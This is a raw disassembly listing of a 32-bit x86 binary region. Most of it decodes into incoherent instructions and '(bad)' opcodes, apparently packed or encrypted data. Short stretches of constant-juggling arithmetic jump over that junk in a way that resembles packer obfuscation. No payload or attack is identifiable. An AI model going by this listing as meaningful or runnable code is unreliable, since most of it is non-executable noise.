  40bdef:	scas   eax,DWORD PTR es:[edi]
  40bdf0:	popf   
  40bdf1:	or     DWORD PTR [edx-0x78d994a0],edi
  40bdf7:	mov    bh,0xa1
  40bdf9:	mov    ch,0x92
  40bdfb:	ret    0x2158
  40bdfe:	icebp  
  40bdff:	mov    DWORD PTR [ebx],ebx
  40be01:	fsubp  st(0),st
  40be03:	adc    BYTE PTR [ebp+0x4c],0x3e
  40be07:	fmul   st,st(4)
  40be09:	pop    es
  40be0a:	jge    0x40be7f
  40be0c:	add    DWORD PTR [esi],edi
  40be0e:	jb     0x40bdc2
  40be10:	outs   dx,DWORD PTR ds:[esi]
  40be11:	dec    edi
  40be12:	mov    dh,0x32
  40be14:	xchg   esp,eax
  40be15:	jecxz  0x40bda2
  40be17:	das    
  40be18:	inc    ebx
  40be19:	pop    edi
  40be1a:	aad    0xef
  40be1c:	in     al,0x4e
  40be1e:	int    0x49
  40be20:	loopne 0x40be7c
  40be22:	jno    0x40be4b
  40be24:	jae    0x40be36
  40be26:	enter  0xfb19,0xc4
  40be2a:	add    BYTE PTR [ebp+0x6f],ch
  40be2d:	inc    ebx
  40be2e:	pop    ebp
  40be2f:	dec    ebx
  40be30:	test   eax,0xc3da592b
  40be35:	outs   dx,BYTE PTR ds:[esi]
  40be36:	xor    eax,0x5194b970
  40be3b:	ror    BYTE PTR [ecx+0x30],1
  40be3e:	mov    DWORD PTR [esi+0x2],esi
  40be41:	sub    BYTE PTR [edi],dh
  40be43:	fisubr WORD PTR [edx-0x5e0448b8]
  40be49:	mov    esp,0x80730b00
  40be4e:	fdiv   DWORD PTR [ebp-0x1273bcc0]
  40be54:	shr    DWORD PTR [edi-0x508cafda],0x37
  40be5b:	dec    ebp
  40be5c:	push   ds
  40be5d:	dec    edi
  40be5e:	dec    ebx
  40be5f:	out    dx,eax
  40be60:	sub    edi,ecx
  40be62:	gs xor al,0x89
  40be65:	mov    cs,WORD PTR [edx+0x1ff50701]
  40be6b:	jo     0x40be84
  40be6d:	and    eax,0xa6d8cf7e
  40be72:	mov    ebx,0x404ec1e5
  40be77:	ficomp DWORD PTR [ebp-0xaf3a14b]
  40be7d:	cdq    
  40be7e:	fs dec eax
  40be80:	add    DWORD PTR [eax],edx
  40be82:	push   esp
  40be83:	addr16 sbb al,0x28
  40be86:	cmp    ch,BYTE PTR [edx+0x61]
  40be89:	add    eax,0xd0313d9d
  40be8e:	sahf   
  40be8f:	outs   dx,BYTE PTR ds:[esi]
  40be90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be91:	xchg   esi,eax
  40be92:	dec    ebx
  40be93:	mov    bh,0x68
  40be95:	cmp    ah,ah
  40be97:	ins    DWORD PTR es:[edi],dx
  40be98:	pop    esp
  40be99:	loope  0x40bea6
  40be9b:	xor    bh,dh
  40be9d:	adc    BYTE PTR ds:[ecx],al
  40bea0:	xor    eax,0xd27dbae5
  40bea5:	adc    DWORD PTR [ebp-0x4f],edi
  40bea8:	sbb    BYTE PTR [edi],0x78
  40beab:	add    eax,0x4dfc694f
  40beb0:	xor    al,0x5c
  40beb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beb3:	pop    ss
  40beb4:	jmp    0x9614:0xdbba0526
  40bebb:	scas   eax,DWORD PTR es:[edi]
  40bebc:	jmp    0x4e96:0x5718629a
  40bec3:	mov    es,WORD PTR fs:[ebx]
  40bec6:	xchg   ebp,eax
  40bec7:	add    DWORD PTR [eax-0x13379d19],edx
  40becd:	sub    eax,0x70ffefa5
  40bed2:	icebp  
  40bed3:	mov    eax,ds:0x55776936
  40bed8:	jmp    0x76fd5e8d
  40bedd:	or     ch,BYTE PTR [esi]
  40bedf:	add    ch,BYTE PTR [edi-0x9c5d6e7]
  40bee5:	xchg   ebx,eax
  40bee6:	outs   dx,BYTE PTR ds:[esi]
  40bee7:	mov    eax,0xc2ccf188
  40beec:	bswap  edx
  40beee:	lock rol DWORD PTR [esp+edi*8-0x2078dd5],cl
  40bef6:	add    BYTE PTR [ecx+edx*8-0x3d],0x6d
  40befb:	push   ebx
  40befc:	mov    ecx,es
  40befe:	outs   dx,BYTE PTR ds:[esi]
  40beff:	jg     0x40be93
  40bf01:	adc    BYTE PTR ds:0xa29bf749,0xc7
  40bf08:	inc    ebp
  40bf09:	cld    
  40bf0a:	test   BYTE PTR [ebp+0x0],dh
  40bf0d:	add    bh,al
  40bf0f:	inc    ebp
  40bf10:	clc    
  40bf11:	lahf   
  40bf12:	jl     0x40bf14
  40bf14:	add    BYTE PTR [ebx-0x2dcc07bb],cl
  40bf1a:	push   0x3
  40bf1c:	pop    ecx
  40bf1d:	div    ecx
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf22:	xor    edx,edx
  40bf24:	push   0x2
  40bf26:	add    eax,0x14d3
  40bf2b:	and    eax,ecx
  40bf2d:	mov    ecx,0x6404
  40bf32:	sub    ecx,eax
  40bf34:	mov    DWORD PTR [ebp-0x74],ecx
  40bf37:	mov    DWORD PTR [ebp-0xc],0x13b5
  40bf3e:	mov    DWORD PTR [ebp-0x8],0x2e54
  40bf45:	mov    DWORD PTR [ebp-0x4],0x2f11
  40bf4c:	mov    eax,DWORD PTR [ebp-0x8]
  40bf4f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf52:	jmp    0x40c35d
  40bf57:	std    
  40bf58:	jno    0x40bf52
  40bf5a:	dec    ecx
  40bf5b:	mov    esp,0x32b9b44c
  40bf60:	rcr    DWORD PTR [esi+0x3ec5c890],1
  40bf66:	fld    QWORD PTR [edx-0x39]
  40bf69:	mov    esi,0xbec492be
  40bf6e:	mov    esi,0x8ac6db2e
  40bf73:	jne    0x40bf70
  40bf75:	psubq  mm5,mm7
  40bf78:	cmp    BYTE PTR [ebp-0x20],0x89
  40bf7c:	lahf   
  40bf7d:	jb     0x40bf3e
  40bf7f:	pop    ds
  40bf80:	jae    0x40bf24
  40bf82:	push   ecx
  40bf83:	in     al,dx
  40bf84:	dec    ebp
  40bf85:	fild   WORD PTR [ebp+0x36]
  40bf88:	sbb    ebx,ebx
  40bf8a:	push   cs
  40bf8b:	mov    ebp,0x61dff409
  40bf90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf91:	add    bh,BYTE PTR [edi+0x39]
  40bf94:	dec    edi
  40bf95:	in     eax,0xa1
  40bf97:	enter  0xef63,0xf4
  40bf9b:	push   eax
  40bf9c:	stc    
  40bf9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf9e:	icebp  
  40bf9f:	xor    DWORD PTR [ecx-0x4e],esp
  40bfa2:	cli    
  40bfa3:	mov    edx,0x3969b796
  40bfa8:	jecxz  0x40bfbf
  40bfaa:	mov    al,0x23
  40bfac:	js     0x40bfff
  40bfae:	mov    dl,0xb2
  40bfb0:	inc    ecx
  40bfb1:	mov    bh,0x8f
  40bfb3:	repnz sbb edi,DWORD PTR [ebp-0x4e]
  40bfb7:	mul    DWORD PTR [ecx]
  40bfb9:	out    dx,eax
  40bfba:	sti    
  40bfbb:	mov    dl,0xba
  40bfbd:	(bad)
  40bfc1:	or     esi,ebp
  40bfc3:	add    eax,0xa7474957
  40bfc8:	jno    0x40bfd3
  40bfca:	mov    ds:0x7364479b,al
  40bfcf:	and    BYTE PTR [ebp+0x51],ah
  40bfd2:	mov    eax,ds:0x3117b464
  40bfd7:	aad    0x14
  40bfd9:	xor    al,0x26
  40bfdb:	(bad)  
  40bfdc:	adc    DWORD PTR [eax+0x26],edx
  40bfdf:	gs push es
  40bfe1:	lds    esi,FWORD PTR [eax+ebx*2-0x4f085f2c]
  40bfe8:	push   0x3786f5bb
  40bfed:	jp     0x40c067
  40bfef:	jne    0x40bfbc
  40bff1:	dec    esp
  40bff2:	mov    al,0x97
  40bff4:	jnp    0x40c047
  40bff6:	test   edi,edi
  40bff8:	sti    
  40bff9:	stos   DWORD PTR es:[edi],eax
  40bffa:	mov    edi,0xf8a30e6
  40bfff:	dec    edi
  40c000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c001:	(bad)  
  40c002:	mov    ebx,0x551d05cc
  40c007:	inc    BYTE PTR [eax+eax*2-0x403802a6]
  40c00e:	jne    0x40bff4
  40c010:	pop    ebx
  40c011:	jp     0x40bfbc
  40c013:	nop
  40c014:	jp     0x40c04b
  40c016:	xchg   ebp,eax
  40c017:	pop    eax
  40c018:	mov    al,ds:0x127b0bb1
  40c01d:	pop    esi
  40c01e:	add    bh,bh
  40c020:	mov    ebx,0x23a73151
  40c025:	mov    ds:0x7e7c3058,al
  40c02a:	dec    edx
  40c02b:	ret    
  40c02c:	call   0xad22:0x35707434
  40c033:	inc    edx
  40c034:	jo     0x40bfe0
  40c036:	inc    esi
  40c037:	call   0x87a055b8
  40c03c:	mov    dh,0xd5
  40c03e:	and    al,0xec
  40c040:	adc    DWORD PTR [ecx],ebx
  40c042:	clc    
  40c043:	loopne 0x40c008
  40c045:	jae    0x40bffc
  40c047:	xlat   BYTE PTR ds:[ebx]
  40c048:	pop    ebx
  40c049:	or     DWORD PTR [esi+esi*1-0x67],esp
  40c04d:	std    
  40c04e:	mov    edi,0x87907ce6
  40c053:	push   ecx
  40c054:	imul   edx,DWORD PTR [eax-0x69],0xac6611a7
  40c05b:	fist   DWORD PTR [ebp+0x67]
  40c05e:	std    
  40c05f:	sub    al,0x4f
  40c061:	or     dh,al
  40c063:	(bad)  
  40c064:	sub    ah,BYTE PTR [ecx]
  40c066:	ffreep st(1)
  40c068:	leave  
  40c069:	mov    edx,0xef549659
  40c06e:	jmp    0xa043d165
  40c073:	mov    al,0x2
  40c075:	mov    esp,0xc627dbb5
  40c07a:	pop    esi
  40c07b:	push   eax
  40c07c:	pusha  
  40c07d:	imul   edi,DWORD PTR [eax],0xffffff80
  40c080:	(bad)  
  40c081:	mov    esp,esi
  40c083:	adc    al,0xc0
  40c085:	fistp  WORD PTR [ebp+0x7676d6bb]
  40c08b:	sub    DWORD PTR [ebx],ebp
  40c08d:	sub    DWORD PTR [edi-0x6a],0x631f7bcd
  40c094:	jbe    0x40c0ea
  40c096:	push   DWORD PTR [edx+0x3e72f644]
  40c09c:	mov    al,ds:0x425295cb
  40c0a1:	adc    edx,DWORD PTR ds:0x67396017
  40c0a7:	idiv   DWORD PTR [edi+0x2635e445]
  40c0ad:	adc    eax,0x3fd61e27
  40c0b2:	loope  0x40c0aa
  40c0b4:	lock rcl BYTE PTR [edx],cl
  40c0b7:	mov    BYTE PTR [ebp+0x529bc13f],bh
  40c0bd:	call   0x2d7f:0x7988e5f3
  40c0c4:	ret    
  40c0c5:	sbb    edx,DWORD PTR [eax+0x4c]
  40c0c8:	jbe    0x40c136
  40c0ca:	repz xchg esi,eax
  40c0cc:	loop   0x40c06f
  40c0ce:	jmp    0x96e73f47
  40c0d3:	lahf   
  40c0d4:	mov    dh,0xea
  40c0d6:	adc    eax,0xf1259007
  40c0db:	fidivr DWORD PTR [ebp-0xe541ade]
  40c0e1:	inc    esp
  40c0e2:	fwait
  40c0e3:	ror    DWORD PTR [ebp+ebp*8-0x3b],1
  40c0e7:	adc    eax,0x124f678a
  40c0ec:	pop    edx
  40c0ed:	xor    BYTE PTR [eax+0x5e7dc20f],dl
  40c0f3:	jecxz  0x40c084
  40c0f5:	scas   al,BYTE PTR es:[edi]
  40c0f6:	cmp    BYTE PTR [ecx-0x5c],bl
  40c0f9:	mov    eax,0xbd8be9f2
  40c0fe:	push   cs
  40c0ff:	pop    ecx
  40c100:	sub    dh,0x98
  40c103:	dec    edi
  40c104:	cmp    eax,0x73d81330
  40c109:	add    ah,BYTE PTR [edx+0x3fe7731]
  40c10f:	pop    esp
  40c110:	cwde   
  40c111:	mov    eax,ds:0xa0b2a356
  40c116:	loopne 0x40c162
  40c118:	pop    ds
  40c119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c11a:	inc    ebx
  40c11b:	sbb    dl,0x7a
  40c11e:	inc    ecx
  40c11f:	(bad)  
  40c121:	jbe    0x40c116
  40c123:	push   ss
  40c124:	(bad)  [esi-0x5e566fcf]
  40c12a:	jnp    0x40c11f
  40c12c:	daa    
  40c12d:	xchg   esp,eax
  40c12e:	cld    
  40c12f:	(bad)  
  40c131:	rcl    BYTE PTR [edi-0x6f],cl
  40c134:	xchg   DWORD PTR fs:[edx-0x3],edi
  40c138:	call   0xe55a:0x915512b7
  40c13f:	push   eax
  40c140:	sti    
  40c141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c142:	mov    bl,0xad
  40c144:	add    eax,0x2f14c582
  40c149:	inc    ebp
  40c14a:	mov    edi,0x345a0325
  40c14f:	gs pop es
  40c151:	inc    edx
  40c152:	daa    
  40c153:	dec    edx
  40c154:	jno    0x40c182
  40c156:	mov    bh,0x10
  40c158:	mov    esp,0xe59e8d64
  40c15d:	mov    esi,0xeddc01ee
  40c162:	pop    esi
  40c163:	fcom   DWORD PTR [ecx]
  40c165:	mov    cl,0x48
  40c167:	push   ecx
  40c168:	iret   
  40c169:	(bad)  
  40c16a:	sti    
  40c16b:	repnz rcr esi,0xdc
  40c16f:	mov    ah,0x8
  40c171:	xchg   BYTE PTR [ebx-0x38],ch
  40c174:	pop    eax
  40c175:	mov    dh,0x27
  40c177:	mov    eax,0x68700f7d
  40c17c:	fxch   st(6)
  40c17e:	lds    ebp,FWORD PTR [ecx-0xf]
  40c181:	ss addr16 jp 0x40c18e
  40c185:	add    BYTE PTR [ebp+ecx*8-0x26],dh
  40c189:	or     dl,BYTE PTR ds:0x15728575
  40c18f:	add    BYTE PTR [ecx+0x25f54272],bh
  40c195:	mov    ds:0x3267c80e,al
  40c19a:	mov    ss,WORD PTR [edx+0x6b876ad5]
  40c1a0:	inc    edi
  40c1a1:	imul   ebp,esi,0xc201ce12
  40c1a7:	enter  0x5f22,0x3a
  40c1ab:	loopne 0x40c137
  40c1ad:	mov    DWORD PTR [ebx-0x3f],esp
  40c1b0:	inc    esi
  40c1b1:	sar    DWORD PTR [edx],1
  40c1b3:	and    ecx,DWORD PTR [esp+ebx*8-0x28]
  40c1b7:	and    DWORD PTR [edx+0x2f],0xc5740157
  40c1be:	jns    0x40c14b
  40c1c0:	xlat   BYTE PTR ds:[ebx]
  40c1c1:	jp     0x40c23b
  40c1c3:	dec    ecx
  40c1c4:	loopne 0x40c1fa
  40c1c6:	inc    edi
  40c1c7:	xor    al,0x3f
  40c1c9:	fdivr  st,st(2)
  40c1cb:	mov    ds:0x5839058a,eax
  40c1d0:	jmp    0x50e7:0xcd797d7c
  40c1d7:	mov    eax,0x2e0e8af7
  40c1dc:	or     edx,ecx
  40c1de:	xor    eax,DWORD PTR [esi+0x53]
  40c1e1:	pop    ss
  40c1e2:	xchg   esp,eax
  40c1e3:	add    eax,0x460960fc
  40c1e8:	push   0xdc9f5365
  40c1ed:	stc    
  40c1ee:	inc    esp
  40c1ef:	retf   
  40c1f0:	pop    esi
  40c1f1:	iret   
  40c1f2:	popf   
  40c1f3:	push   edi
  40c1f4:	inc    ebx
  40c1f5:	shl    bl,cl
  40c1f7:	dec    esp
  40c1f8:	dec    esi
  40c1f9:	sbb    al,ch
  40c1fb:	outs   dx,DWORD PTR ds:[esi]
  40c1fc:	add    bh,BYTE PTR [ecx-0x47]
  40c1ff:	mov    ?,WORD PTR [edx+eax*1+0x2a]
  40c203:	pusha  
  40c204:	addr16 adc eax,0x4a8946be
  40c20a:	ds pop esi
  40c20c:	fsub   st(5),st
  40c20e:	pop    esi
  40c20f:	hlt    
  40c210:	inc    edi
  40c211:	xchg   edx,eax
  40c212:	jo     0x40c1d0
  40c214:	inc    esi
  40c215:	test   bh,ah
  40c217:	or     DWORD PTR [edx+0x646f07f7],0xba83d739
  40c221:	(bad)  
  40c222:	repnz xor dl,bh
  40c225:	and    eax,0xb9b21b73
  40c22a:	inc    ebp
  40c22b:	lods   al,BYTE PTR ds:[esi]
  40c22c:	fst    DWORD PTR [edx+edx*2]
  40c22f:	scas   al,BYTE PTR es:[edi]
  40c230:	loop   0x40c1ec
  40c232:	(bad)  
  40c233:	and    BYTE PTR [edx-0x70d47072],ah
  40c239:	lock jmp 0xf70191cd
  40c23f:	mov    ds:0x200aacf1,al
  40c244:	retf   0xd45f
  40c247:	test   al,0xc5
  40c249:	fild   DWORD PTR [edi+0xb94d58c]
  40c24f:	jp     0x40c216
  40c251:	jmp    0x40c28d
  40c253:	in     al,dx
  40c254:	jecxz  0x40c297
  40c256:	add    eax,0x46cec561
  40c25b:	adc    eax,0xb8edf4e3
  40c260:	jle    0x40c29a
  40c262:	les    edx,FWORD PTR [ebp+edi*4+0x2fb54a38]
  40c269:	xchg   ecx,eax
  40c26a:	jmp    0x3fa:0x7f9c9412
  40c271:	push   ebp
  40c272:	xor    al,0xda
  40c274:	jle    0x40c2a4
  40c276:	sub    DWORD PTR [edx+0x18],eax
  40c279:	jb     0x40c262
  40c27b:	cwde   
  40c27c:	inc    ebp
  40c27d:	jnp    0x40c220
  40c27f:	xchg   ecx,eax
  40c280:	ins    DWORD PTR es:[edi],dx
  40c281:	xchg   ecx,eax
  40c282:	test   DWORD PTR [ebx+0x27],edx
  40c285:	mov    al,ds:0x152e17c
  40c28a:	jne    0x40c2cb
  40c28c:	xor    al,0x30
  40c28e:	push   ds
  40c28f:	push   ss
  40c290:	mov    ebp,0x93b04067
  40c295:	mov    DWORD PTR [edx-0x459aedf],esi
  40c29b:	add    esp,0x722d99d8
  40c2a1:	or     ebp,DWORD PTR [eax-0x482a140a]
  40c2a7:	(bad)  [eax]
  40c2a9:	sub    al,0xfa
  40c2ab:	pusha  
  40c2ac:	sar    DWORD PTR [edx+0x5f66d349],1
  40c2b2:	add    al,0x92
  40c2b4:	jns    0x40c291
  40c2b6:	pop    esi
  40c2b7:	cld    
  40c2b8:	pop    esi
  40c2b9:	and    eax,0x8623d49b
  40c2be:	out    0xef,eax
  40c2c0:	daa    
  40c2c1:	dec    ebx
  40c2c2:	mov    edx,0x72ef8344
  40c2c7:	imul   esi,DWORD PTR [edx],0xffffff9c
  40c2ca:	inc    edi
  40c2cb:	sub    BYTE PTR [ebx-0x54],al
  40c2ce:	add    al,0x33
  40c2d0:	ficomp DWORD PTR [eax-0x44e5797e]
  40c2d6:	aad    0xe4
  40c2d8:	popa   
  40c2d9:	scas   al,BYTE PTR es:[edi]
  40c2da:	jg     0x40c307
  40c2dc:	das    
  40c2dd:	lahf   
  40c2de:	rcr    ch,cl
  40c2e0:	out    dx,eax
  40c2e1:	xchg   DWORD PTR [edx],esi
  40c2e3:	jg     0x40c265
  40c2e5:	popf   
  40c2e6:	mov    BYTE PTR [esi+0x53],dl
  40c2e9:	jae    0x40c2f7
  40c2eb:	mov    eax,0xeabe98f0
  40c2f0:	add    al,0xc9
  40c2f2:	push   ebx
  40c2f3:	jge    0x40c282
  40c2f5:	addr16 mov dh,0x11
  40c2f8:	in     al,dx
  40c2f9:	inc    ecx
  40c2fa:	sbb    cl,BYTE PTR [ebp-0x5456d61e]
  40c300:	or     bl,BYTE PTR [ebx+0x24]
  40c303:	inc    ecx
  40c304:	scas   eax,DWORD PTR es:[edi]
  40c305:	sbb    BYTE PTR [esi+0x26],bh
  40c308:	(bad)  
  40c309:	popf   
  40c30a:	dec    esi
  40c30b:	pusha  
  40c30c:	mov    esp,0x2c7279b0
  40c311:	lods   al,BYTE PTR ds:[esi]
  40c312:	ss dec ecx
  40c314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c315:	jl     0x40c2d3
  40c317:	push   edx
  40c318:	sahf   
  40c319:	jo     0x40c312
  40c31b:	dec    esi
  40c31c:	lahf   
  40c31d:	(bad)  
  40c31e:	cmc    
  40c31f:	pop    ebx
  40c320:	pop    ss
  40c321:	loop   0x40c386
  40c323:	repz push esp
  40c325:	rol    BYTE PTR [edi-0x61],0x4
  40c329:	dec    ecx
  40c32a:	sbb    BYTE PTR [ebp+0x6c],cl
  40c32d:	inc    esi
  40c32e:	mov    ?,esi
  40c330:	in     al,dx
  40c331:	or     edi,esi
  40c333:	(bad)  
  40c334:	cmp    BYTE PTR [esp+esi*8+0x5a6763ae],bh
  40c33b:	cmp    ah,0x73
  40c33e:	(bad)  
  40c33f:	xchg   al,al
  40c341:	cli    
  40c342:	ficom  WORD PTR [esi-0x26]
  40c345:	add    eax,0x9cb5971f
  40c34a:	jne    0x40c349
  40c34c:	mov    edx,0x4471c2bf
  40c351:	mov    esp,0x9f8c3b6e
  40c356:	inc    esp
  40c357:	mov    edi,0x88975171
  40c35c:	fimul  DWORD PTR [ebp-0x65ebfe7c]
  40c362:	(bad)  
  40c363:	(bad)  
  40c364:	mov    ecx,0x5e208
  40c369:	div    ecx
  40c36b:	mov    ecx,DWORD PTR [ebp-0xc]
  40c36e:	lea    eax,[eax+ecx*1+0x40c7]
  40c375:	mov    DWORD PTR [ebp-0x24],eax
  40c378:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40c37f:	mov    DWORD PTR [ebp-0x8],0x16ac
  40c386:	mov    DWORD PTR [ebp-0xc],0x2185
  40c38d:	mov    eax,DWORD PTR [ebp-0xc]
  40c390:	mov    ecx,DWORD PTR [ebp-0x8]
  40c393:	xor    eax,0x1f75
  40c398:	sub    eax,ecx
  40c39a:	mov    ecx,DWORD PTR [ebp-0x4]
  40c39d:	sub    eax,ecx
  40c39f:	xor    eax,0xc3e
  40c3a4:	mov    DWORD PTR [ebp-0x58],eax
  40c3a7:	mov    DWORD PTR [ebp-0x14],0x66bd
  40c3ae:	pop    ecx
  40c3af:	mov    DWORD PTR [ebp-0x4],ecx
  40c3b2:	mov    DWORD PTR [ebp-0x8],0x3374
  40c3b9:	mov    DWORD PTR [ebp-0xc],0x3c31
  40c3c0:	mov    eax,DWORD PTR [ebp-0xc]
  40c3c3:	mov    edx,DWORD PTR [ebp-0x8]
  40c3c6:	mov    esi,DWORD PTR [ebp-0x4]
  40c3c9:	xor    eax,edx
  40c3cb:	xor    edx,edx
  40c3cd:	div    esi
  40c3cf:	mov    edx,DWORD PTR [ebp-0x14]
  40c3d2:	and    eax,edx
  40c3d4:	sub    eax,0x680
  40c3d9:	mov    DWORD PTR [ebp-0x24],eax
  40c3dc:	mov    DWORD PTR [ebp-0x30],0x5f68
  40c3e3:	mov    DWORD PTR [ebp-0x2c],0x398b
  40c3ea:	mov    DWORD PTR [ebp-0x4],0x5034
  40c3f1:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40c3f8:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40c3ff:	mov    DWORD PTR [ebp-0x14],0xee2
  40c406:	mov    eax,DWORD PTR [ebp-0x14]
  40c409:	add    eax,DWORD PTR [ebp-0xc]
  40c40c:	mov    edx,DWORD PTR [ebp-0x8]
  40c40f:	xor    eax,edx
  40c411:	mov    edx,DWORD PTR [ebp-0x4]
  40c414:	or     eax,edx
  40c416:	mov    edx,DWORD PTR [ebp-0x2c]
  40c419:	or     eax,edx
  40c41b:	mov    edx,DWORD PTR [ebp-0x30]
  40c41e:	and    eax,edx
  40c420:	mov    edx,0x5b68
  40c425:	sub    edx,eax
  40c427:	mov    DWORD PTR [ebp-0x24],edx
  40c42a:	mov    DWORD PTR [ebp-0x48],0x3308
  40c431:	mov    DWORD PTR [ebp-0x44],0x59a4
  40c438:	mov    DWORD PTR [ebp-0x38],0x2775
  40c43f:	mov    DWORD PTR [ebp-0x34],0x4da
  40c446:	mov    DWORD PTR [ebp-0x40],0x49d8
  40c44d:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40c454:	mov    DWORD PTR [ebp-0x28],0x338c
  40c45b:	mov    DWORD PTR [ebp-0x24],0x68ed
  40c462:	jmp    0x40c86d
  40c467:	inc    esi
  40c468:	outs   dx,DWORD PTR ds:[esi]
  40c469:	mov    ebx,0x8abcbc70
  40c46e:	ja     0x40c492
  40c470:	or     DWORD PTR [esi-0x5f86ab31],ebp
  40c476:	nop
  40c477:	push   ss
  40c478:	iret   
  40c479:	mov    esi,0xbec492be
  40c47e:	mov    esi,0xc24486bf
  40c483:	cmp    bl,BYTE PTR [ecx+0x5cf055be]
  40c489:	or     eax,0xa3171149
  40c48e:	and    edx,ebx
  40c490:	ins    DWORD PTR es:[edi],dx
  40c491:	je     0x40c41d
  40c493:	xor    esp,DWORD PTR [esi]
  40c495:	add    DWORD PTR [esi-0x2ed2a5e0],ebx
  40c49b:	ret    
  40c49c:	call   0xfd4f916b
  40c4a1:	aam    0x43
  40c4a3:	fbld   TBYTE PTR [ecx]
  40c4a5:	add    dl,bl
  40c4a7:	hlt    
  40c4a8:	ins    BYTE PTR es:[edi],dx
  40c4a9:	xchg   ebp,eax
  40c4aa:	ds mov ch,0xda
  40c4ad:	into   
  40c4ae:	dec    ebx
  40c4af:	mov    esp,0x2a13255a
  40c4b4:	mov    WORD PTR [ebx+0x6fea9f4e],gs
  40c4ba:	and    bl,BYTE PTR [esi]
  40c4bc:	test   BYTE PTR [ebp-0x3a],ch
  40c4bf:	push   eax
  40c4c0:	bnd jl 0x40c4af
  40c4c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4c4:	sbb    edx,DWORD PTR [esi]
  40c4c6:	adc    ebp,DWORD PTR [edi+ebx*1]
  40c4c9:	xchg   DWORD PTR [edx],esp
  40c4cb:	sub    BYTE PTR [edi+0x4b],ch
  40c4ce:	fisubr WORD PTR [edx]
  40c4d0:	add    edx,DWORD PTR [ecx+edi*8+0x1af7b08d]
  40c4d7:	hlt    
  40c4d8:	cmp    BYTE PTR [edi+0x2923a4ed],dh
  40c4de:	int3   
  40c4df:	adc    ebp,DWORD PTR [ecx-0x6]
  40c4e2:	lds    esp,FWORD PTR [ebx+eax*4-0xff63252]
  40c4e9:	dec    esi
  40c4ea:	sub    BYTE PTR [ebx+ecx*4+0x66b04f13],0xe0
  40c4f2:	sbb    ah,bl
  40c4f4:	cmp    BYTE PTR [ebx-0x314926ba],0xd4
  40c4fb:	ds sbb al,0x4e
  40c4fe:	aam    0x23
  40c500:	mov    DWORD PTR [ecx-0x2be2a3aa],esp
  40c506:	punpckhdq mm6,QWORD PTR [edi]
  40c509:	ret    
  40c50a:	idiv   BYTE PTR [ebx+0x49b26ecb]
  40c510:	jle    0x40c574
  40c512:	pop    ebp
  40c513:	in     al,0xa5
  40c515:	or     al,0x9
  40c517:	jle    0x40c579
  40c519:	(bad)  
  40c51a:	out    0x54,al
  40c51c:	mov    esi,0x72bf9886
  40c521:	arpl   WORD PTR [esi],dx
  40c523:	sbb    cl,BYTE PTR [ebx+0x1fe670c6]
  40c529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c52a:	icebp  
  40c52b:	std    
  40c52c:	adc    DWORD PTR [edx],ebx
  40c52e:	into   
  40c52f:	mov    ebx,0xff1059db
  40c534:	ins    DWORD PTR es:[edi],dx
  40c535:	hlt    
  40c536:	push   0xffffff8f
  40c538:	and    esi,esp
  40c53a:	or     ah,dh
  40c53c:	inc    ebx
  40c53d:	lock rcr BYTE PTR [eax+0x1b125007],1
  40c544:	aad    0x32
  40c546:	and    bh,BYTE PTR [edx]
  40c548:	add    DWORD PTR [edi-0x2a],eax
  40c54b:	ds jecxz 0x40c594
  40c54e:	in     al,dx
  40c54f:	lods   al,BYTE PTR ds:[esi]
  40c550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c551:	add    dh,al
  40c553:	fmul   DWORD PTR [ecx+0x7]
  40c556:	shr    cl,cl
  40c558:	xchg   BYTE PTR [eax+eax*8],cl
  40c55b:	(bad)  
  40c55c:	add    edx,DWORD PTR [eax]
  40c55e:	frstor ss:[eax+0x70aeb501]
  40c565:	sbb    eax,0x845fc630
  40c56a:	repnz adc dl,BYTE PTR ds:0x40c29d12
  40c571:	call   FWORD PTR [edi+0x77f97e5a]
  40c577:	and    edx,esi
  40c579:	mov    ah,0x0
  40c57b:	jmp    0x40c5f4
  40c57d:	outs   dx,BYTE PTR ds:[esi]
  40c57e:	mov    edi,0x2c3a6567
  40c583:	ja     0x40c52a
  40c585:	and    eax,0x634ddaaf
  40c58a:	or     edx,DWORD PTR [esi]
  40c58c:	lods   eax,DWORD PTR ds:[esi]
  40c58d:	loopne 0x40c59d
  40c58f:	push   es
  40c590:	sbb    al,0x39
  40c592:	pop    edx
  40c593:	sahf   
  40c594:	xchg   edx,eax
  40c595:	adc    esp,DWORD PTR [ebx]
  40c597:	je     0x40c608
  40c599:	ror    BYTE PTR [ebx+edi*8-0x3c05b29d],0xda
  40c5a1:	jmp    0x40c5f1
  40c5a3:	pop    ecx
  40c5a4:	sub    DWORD PTR [edi],0x27
  40c5a7:	test   DWORD PTR [ebx+0xe],edx
  40c5aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5ab:	clc    
  40c5ac:	xor    cl,ah
  40c5ae:	aaa    
  40c5af:	pop    ss
  40c5b0:	stc    
  40c5b1:	stc    
  40c5b2:	inc    ebx
  40c5b3:	and    al,0x71
  40c5b5:	inc    edi
  40c5b6:	lock imul BYTE PTR [ecx+0x59]
  40c5ba:	mov    dh,0x76
  40c5bc:	xor    ecx,DWORD PTR [ecx-0x15c64c73]
  40c5c2:	imul   esi,DWORD PTR [ebx+0x62109a06],0xffffffa6
  40c5c9:	retf   
  40c5ca:	(bad)  
  40c5cc:	(bad)  
  40c5cd:	mov    edx,0x2b0e4791
  40c5d2:	add    eax,0x48894e1c
  40c5d7:	mov    es,WORD PTR [esi]
  40c5d9:	push   edx
  40c5da:	pop    es
  40c5db:	mov    ?,WORD PTR [edi]
  40c5dd:	or     ah,BYTE PTR [ebx]
